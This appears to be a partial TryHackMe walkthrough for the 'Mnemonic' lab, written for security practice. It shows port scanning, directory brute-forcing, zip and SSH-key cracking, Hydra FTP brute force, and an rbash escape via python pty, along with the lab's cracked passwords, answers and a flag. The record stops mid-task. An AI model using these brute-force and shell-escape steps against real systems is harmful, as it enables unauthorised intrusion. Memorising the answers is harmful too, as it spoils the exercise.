----
I hope you have fun.
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/497ceb5feaeff50ff8b1e6c119973591.png)


### Task 1  Mnemonic

 Start Machine

  

# Hit me!

You need 1 things : hurry up  

  

  

                                       [https://www.youtube.com/watch?v=pBSR3DyobIY](https://www.youtube.com/watch?v=pBSR3DyobIY)  

                                         

Answer the questions below

  

Correct Answer

### Task 2  Enumerate

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.188.13 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.188.13:21
Open 10.10.188.13:80
Open 10.10.188.13:1337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 15:33 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:33
Completed NSE at 15:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:33
Completed NSE at 15:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:33
Completed NSE at 15:33, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:33
Completed Parallel DNS resolution of 1 host. at 15:33, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:33
Scanning 10.10.188.13 [3 ports]
Discovered open port 21/tcp on 10.10.188.13
Discovered open port 80/tcp on 10.10.188.13
Discovered open port 1337/tcp on 10.10.188.13
Completed Connect Scan at 15:33, 0.32s elapsed (3 total ports)
Initiating Service scan at 15:33
Scanning 3 services on 10.10.188.13
Completed Service scan at 15:33, 6.52s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.188.13.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:33
Completed NSE at 15:33, 8.39s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:33
Completed NSE at 15:33, 1.88s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:33
Completed NSE at 15:33, 0.00s elapsed
Nmap scan report for 10.10.188.13
Host is up, received user-set (0.31s latency).
Scanned at 2023-07-07 15:33:20 EDT for 18s

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
1337/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e042c0a57d426f0022f8c754aa35b9dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+cUIYV9ABbcQFihgqbuJQcxu2FBvx0gwPk5Hn+Eu05zOEpZRYWLq2CRm3++53Ty0R7WgRwayrTTOVt6V7yEkCoElcAycgse/vY+U4bWr4xFX9HMNElYH1UztZnV12il/ep2wVd5nn//z4fOllUZJlGHm3m5zWF/k5yIh+8x7T7tfYNsoJdjUqQvB7IrcKidYxg/hPDWoZ/C+KMXij1n3YXVoDhQwwR66eUF1le90NybORg5ogCfBLSGJQhZhALBLLmxAVOSc4e+nhT/wkhTkHKGzUzW6PzA7fTN3Pgt81+m9vaxVm/j7bXG3RZSzmKlhrmdjEHFUkLmz6bjYu3201
|   256 23eba99b45269ca213abc1ce072b98e0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOJp4tEjJbtHZZtdwGUu6frTQk1CzigA1PII09LP2Edpj6DX8BpTwWQ0XLNSx5bPKr5sLO7Hn6fM6f7yOy8SNHU=
|   256 358fcbe20d112c0b63f2bca034f3dc49 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIiax5oqQ7hT7CgO0CC7FlvGf3By7QkUDcECjpc9oV9k
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:33
Completed NSE at 15:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:33
Completed NSE at 15:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:33
Completed NSE at 15:33, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.36 seconds

http://10.10.188.13/robots.txt
Allow: / 
Disallow: /webmasters/*

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.188.13/webmasters/ -w /usr/share/wordlists/dirb/common.txt -x txt,php 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.188.13/webmasters/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/07 15:40:35 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.188.13/webmasters/.hta.txt             (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.htaccess.php        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.htaccess.txt        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.htaccess            (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.htpasswd            (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.htpasswd.php        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.htpasswd.txt        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.hta.php             (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.hta                 (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/admin                (Status: 301) [Size: 323] [--> http://10.10.188.13/webmasters/admin/]
http://10.10.188.13/webmasters/backups              (Status: 301) [Size: 325] [--> http://10.10.188.13/webmasters/backups/]
http://10.10.188.13/webmasters/index.html           (Status: 200) [Size: 0]
Progress: 13817 / 13845 (99.80%)
===============================================================
2023/07/07 15:41:20 Finished
===============================================================
                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.188.13/webmasters/backups/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,zip,7zip 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.188.13/webmasters/backups/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt,bak,zip,7zip
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/07 15:41:59 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.188.13/webmasters/backups/.html                (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta                 (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta.7zip            (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta.zip             (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta.bak             (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess            (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta.txt             (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta.html            (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta.php             (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess.txt        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess.html       (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess.php        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess.zip        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess.bak        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd            (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd.html       (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd.bak        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess.7zip       (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd.php        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd.txt        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd.zip        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd.7zip       (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/backups.zip          (Status: 200) [Size: 409]

┌──(witty㉿kali)-[~/Downloads]
└─$ file backups.zip 
backups.zip: Zip archive data, at least v1.0 to extract, compression method=store
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ mkdir mnemonic   
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ mv backups.zip mnemonic 
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ cd mnemonic 
                                                                                  
┌──(witty㉿kali)-[~/Downloads/mnemonic]
└─$ unzip backups.zip 
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password: 
   skipping: backups/note.txt        incorrect password

```

How many open ports?

*3*

what is the ssh port number?

*1337*

what is the name of the secret file?  

*backups.zip*


### Task 3  Credentials

```
┌──(witty㉿kali)-[~/Downloads/mnemonic]
└─$ zip2john backups.zip > backups_hash
ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: TS_chk, cmplen=67, decmplen=60, crc=AEE718A8 ts=24E2 cs=24e2 type=8
                                                                                  
┌──(witty㉿kali)-[~/Downloads/mnemonic]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backups_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (backups.zip/backups/note.txt)     
1g 0:00:00:05 DONE (2023-07-07 15:45) 0.1841g/s 2628Kp/s 2628Kc/s 2628KC/s 0066365..001905apekto
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~/Downloads/mnemonic]
└─$ cat backups/note.txt 
@vill

James new ftp username: ftpuser
we have to work hard

┌──(witty㉿kali)-[~/Downloads/mnemonic]
└─$ hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.188.13 -t 64  
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-07 15:47:27
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://10.10.188.13:21/
[STATUS] 729.00 tries/min, 729 tries in 00:01h, 14343684 to do in 327:56h, 50 active
[21][ftp] host: 10.10.188.13   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 14 final worker threads did not complete until end.
[ERROR] 14 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-07 15:48:59

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ ftp 10.10.188.13 
Connected to 10.10.188.13.
220 (vsFTPd 3.0.3)
Name (10.10.188.13:witty): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10001|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
226 Directory send OK.
ftp> ls -lah
229 Entering Extended Passive Mode (|||10063|)
150 Here comes the directory listing.
drwx------   12 1003     1003         4096 Jul 14  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
lrwxrwxrwx    1 1003     1003            9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--    1 1003     1003          220 Jul 13  2020 .bash_logout
-rw-r--r--    1 1003     1003         3771 Jul 13  2020 .bashrc
-rw-r--r--    1 1003     1003          807 Jul 13  2020 .profile
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
226 Directory send OK.
ftp> cd data-1
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10070|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -lah
229 Entering Extended Passive Mode (|||10015|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 13  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10019|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x  in  4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
226 Directory send OK.
ftp> cd data-4
250 Directory successfully changed.
ftp> ls -lah
229 Entering Extended Passive Mode (|||10089|)
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Jul 14  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 14  2020 3
drwxr-xr-x    2 0        0            4096 Jul 14  2020 4
-rwxr-xr-x    1 1001     1001         1766 Jul 13  2020 id_rsa
-rwxr-xr-x    1 1000     1000           31 Jul 13  2020 not.txt
226 Directory send OK.
ftp> mget *
mget 3 [anpqy?]? yes
229 Entering Extended Passive Mode (|||10076|)
550 Failed to open file.
mget 4 [anpqy?]? yes
229 Entering Extended Passive Mode (|||10040|)
550 Failed to open file.
mget id_rsa [anpqy?]? yes
229 Entering Extended Passive Mode (|||10028|)
150 Opening BINARY mode data connection for id_rsa (1766 bytes).
100% |***********************************|  1766        8.42 MiB/s    00:00 ETA
226 Transfer complete.
1766 bytes received in 00:00 (5.80 KiB/s)
mget not.txt [anpqy?]? yes
229 Entering Extended Passive Mode (|||10095|)
150 Opening BINARY mode data connection for not.txt (31 bytes).
100% |***********************************|    31      176.00 KiB/s    00:00 ETA
226 Transfer complete.
31 bytes received in 00:00 (0.09 KiB/s)
ftp> exit
221 Goodbye.

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ cat not.txt 
james change ftp user password

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ cat id_rsa    
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,01762A15A5B935E96A1CF34704C79AC3

pSxCqzRmFf4dcfdkVay0+fN88/GXwl3LXOS1WQrRV26wqXTE1+EaL5LrRtET8mPM
dkScGB/cHICB0cPvn3WU8ptdYCk78w9X9wHpPBa6VLk1eRi7MANLcfRWxQ4GFwXp
CP8KSSZBCduabfcx6eLBBM8fMC+P2kgtIOhnlpt/sAU2zDQa8kZHw8V76pzcBLka
trq4ik4tpsgHqEU4BDw24bNjtJxgEy4sddtpXyy0i3KZ9gm6Uop6/jFG8uuoAQPn
AcwIZSCpjEfiMLzerVNNotZU9I11jRtbdQsxAjLPYY30PyO2cFlgpohvpyMD6lfO
33v8DOV8U69zlyUtUgArfZ9IORPKLOW5VLfuqX8yLsylVrmmuGdlfN+zO5enukjV
cg/mpJL/kePgViEqnTJf5Y8vYJ9tEGko8YBvorrsS0QXN7GJtW8h7IYrsLpXYzeu
FPD5cgEdixE4UlGo7G6nmlkikLsDwjjVIDX9C3eHljAhiktKAu19wbwdaJ8F4WWW
txZv/fsKBSI/JexzOY2lKSFq52Dod6G1eCVf0WgsQrXBOxgKn/iQ0dg4aCVNttni
kKKW3hEQP3gK6B20dnIItFzQpaqapuNJKnAWEj6YG+7QpCjncMEMUDGpCSqnMuYB
PVM3GU4sq5OO14gXtjOgTfBXP07cqkuW6L8XQl+sWobgVuIGmK69wfCZSjy29Hqo
8SmeUAdiv37UenHGLxwjelnNcblLm/BYyW6P6m6pc+zgUSK/MVysGj9B8ryLVcIc
P8O/HKResEUC/MZJGYWIZeu7UK/Ifs5IN/uTYmBM9/44tRJApvY+3rrdUUA3khjY
ZTzeX1/xS5rqprEYcr19ExboGVqNCUMHPwmufZZbB1uUagaR2Cv44j9rU19BVF1s
czMMNJGJSoeA4UKNIuXFVIMbMcZD2fCKaKYWT6C0RDS0TrAf7AUurgHReAqsQhTE
xxaGq7DLLflzVHC7EY2VhdAWmbNbGQi/k7+4wC6HTRbnLMh2kTFYMbGA64hDHxFP
DYJh4ZCEDiyWe1JkmaeAAyc2n0TCVsgEzxgGPGe3tZynVML/rFWDMA0B5kZ9VLS7
j5NOaTeWFwVy55ONPzGgCICsj+izaOuCvsbdJQ7FdQ0LPNzZ/RUFvh4k7E1ZjBos
y9GNQW8WMAWH7SFK91KdX4c+fsAPnHN/v7uF/dRWlzkusrVLznURsVtG0k2BxUwx
PYn3OG7SwGS+DyiFvvV0NspX2oIXEqA6VioqQxc+0dcEGxcyNY5uDut3BENGPD+X
Ut/fe6bIfVse+ovAb6F36SBquuDjJWCHaHyVMASlmmzA6A6XhlSnrxhVP2/cmtdo
zUicXz715Li1enhR6p68AzGhBzYZsF/F9MSbrBgust0zDeNllL/4slZ9zfrg+zUY
weJKZAn1ib9/mG+PcdcPLFTcWIbXvigSx22svaiuG9WbVzU7GolkStYnrTPdDJ8M
Nw6TzknzJ6s79cg6cKPefrQVFXYXYxSZOvK/TElYrirHqBacVwIyMxCbOgoUbsF2
ipwD46fpPTKgP6qwDirNcKtULMtEud/rbqVvnP+fqm5UC+oqoX+lb1g2fvytTXSe
-----END RSA PRIVATE KEY-----

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ chmod 600 id_rsa     
                                                                                
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ ssh2john id_rsa > james_hash.txt
                                                                                
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt james_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bluelove         (id_rsa)     
1g 0:00:00:00 DONE (2023-07-07 16:00) 14.28g/s 399085p/s 399085c/s 399085C/s chooch..baller15
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ ssh -i id_rsa james@10.10.188.13 -p1337
Enter passphrase for key 'id_rsa': 
james@10.10.188.13's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul  7 20:02:03 UTC 2023

  System load:  0.0                Processes:           93
  Usage of /:   34.1% of 12.01GB   Users logged in:     0
  Memory usage: 35%                IP address for eth0: 10.10.188.13
  Swap usage:   0%

  => There is 1 zombie process.


51 packages can be updated.
0 updates are security updates.


Last login: Thu Jul 23 20:40:09 2020 from 192.168.1.5
Broadcast message from root@mnemonic (somewhere) (Fri Jul  7 20:02:30 2023):   
                                                                               
     IPS/IDS SYSTEM ON !!!!                                                    
 **     *     ****  **                                                         
         * **      *  * *                                                      
*   ****                 **                                                    
 *                                                                             
    * *            *                                                           
       *                  *                                                    
         *               *                                                     
        *   *       **                                                         
* *        *            *                                                      
              ****    *                                                        
     *        ****                                                             
                                                                               
 Unauthorized access was detected.       
james@mnemonic:~$ cat 6450.txt
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494
james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt

@vill

james i found a new encryption İmage based name is Mnemonic  

I created the condor password. don't forget the beers on saturday

we’re inside a restricted bash shell, or `rbash`

https://es.linux-console.net/?p=716#gsc.tab=0

james@mnemonic:~$ which $SHELL
/bin/rbash

To escape `rbash`, we can spawn a `pty` shell via `python3`

james@mnemonic:~$ python3 -c "import pty;pty.spawn('/bin/bash')"

james@mnemonic:/home$ ls -lah
total 40K
drwxr-xr-x 10 root    root    4.0K Jul 14  2020 .
drwxr-xr-x 24 root    root    4.0K Jul 13  2020 ..
drwx------  2 root    root    4.0K Jul 14  2020 alex
drwxr--r--  6 condor  condor  4.0K Jul 14  2020 condor
drwx------ 12 ftpuser ftpuser 4.0K Jul 14  2020 ftpuser
drwx------  6 james   james   4.0K Jul 14  2020 james
drwx------  2 root    root    4.0K Jul 14  2020 jeff
drwx------  2 root    root    4.0K Jul 14  2020 john
drwx------  2 root    root    4.0K Jul 14  2020 mike
drwx------  4 vill    vill    4.0K Jul 14  2020 vill
james@mnemonic:/home$ cd condor
bash: cd: condor: Permission denied
james@mnemonic:/home$ cat condor/*
cat: 'condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==': Permission denied
cat: 'condor/'\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\''': Permission denied

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg                                                      
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d                    
THM{a5f82a00e2feee3465249b855be71c01} 

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ wget https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
--2023-07-07 16:09:59--  https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
Resolving i.ytimg.com (i.ytimg.com)... 64.233.186.119, 64.233.190.119, 172.217.192.119, ...
Connecting to i.ytimg.com (i.ytimg.com)|64.233.186.119|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 154514 (151K) [image/jpeg]
Saving to: ‘maxresdefault.jpg’

maxresdefault.jpg           100%[==========================================>] 150.89K   748KB/s    in 0.2s    

2023-07-07 16:10:00 (748 KB/s) - ‘maxresdefault.jpg’ saved [154514/154514]

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ exiftool maxresdefault.jpg                                  
ExifTool Version Number         : 12.57
File Name                       : maxresdefault.jpg
Directory                       : .
File Size                       : 155 kB
File Modification Date/Time     : 2023:07:07 16:10:00-04:00
File Access Date/Time           : 2023:07:07 16:10:00-04:00
File Inode Change Date/Time     : 2023:07:07 16:10:00-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1280
Image Height                    : 720
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1280x720
Megapixels                      : 0.922
                                                                                                               
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ eog maxresdefault.jpg    

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ cat 6450.txt        
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494

https://github.com/MustafaTanguner/Mnemonic


┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ git clone https://github.com/MustafaTanguner/Mnemonic.git 
Cloning into 'Mnemonic'...
remote: Enumerating objects: 193, done.
remote: Counting objects: 100% (52/52), done.
remote: Compressing objects: 100% (51/51), done.
remote: Total 193 (delta 20), reused 1 (delta 0), pack-reused 141
Receiving objects: 100% (193/193), 6.78 MiB | 1.77 MiB/s, done.
Resolving deltas: 100% (88/88), done.

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ cd Mnemonic 
                                                                                                               
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups/Mnemonic]
└─$ ls
image  LICENSE  Mnemonic.py  __pycache__  README.md  sozlukler.py
                                                                                                               
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups/Mnemonic]
└─$ python3 Mnemonic.py
Traceback (most recent call last):
  File "/home/witty/Downloads/mnemonic/backups/Mnemonic/Mnemonic.py", line 3, in <module>
    import cv2
ModuleNotFoundError: No module named 'cv2'
                                                                                                               
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups/Mnemonic]
└─$ pip3 install opencv-python
Defaulting to user installation because normal site-packages is not writeable
Collecting opencv-python
  Downloading opencv_python-4.8.0.74-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (61.7 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 61.7/61.7 MB 4.1 MB/s eta 0:00:00
Requirement already satisfied: numpy>=1.21.2 in /usr/lib/python3/dist-packages (from opencv-python) (1.24.1)
Installing collected packages: opencv-python
Successfully installed opencv-python-4.8.0.74

[notice] A new release of pip is available: 23.0.1 -> 23.1.2
[notice] To update, run: pip install --upgrade pip
                                                                                                               
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups/Mnemonic]
└─$ python3 Mnemonic.py       


ooo        ooooo                                                                o8o            
`88.       .888'                                                                `"'            
 888b     d'888  ooo. .oo.    .ooooo.  ooo. .oo.  .oo.    .ooooo.  ooo. .oo.   oooo   .ooooo.  
 8 Y88. .P  888  `888P"Y88b  d88' `88b `888P"Y88bP"Y88b  d88' `88b `888P"Y88b  `888  d88' `"Y8 
 8  `888'   888   888   888  888ooo888  888   888   888  888   888  888   888   888  888       
 8    Y     888   888   888  888    .o  888   888   888  888   888  888   888   888  888   .o8 
o8o        o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' 


******************************* Welcome to Mnemonic Encryption Software *********************************
*********************************************************************************************************
***************************************** Author:@villwocki *********************************************
*********************************************************************************************************
****************************** https://www.youtube.com/watch?v=pBSR3DyobIY ******************************
---------------------------------------------------------------------------------------------------------


┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ mv maxresdefault.jpg t.jpg
                                                               
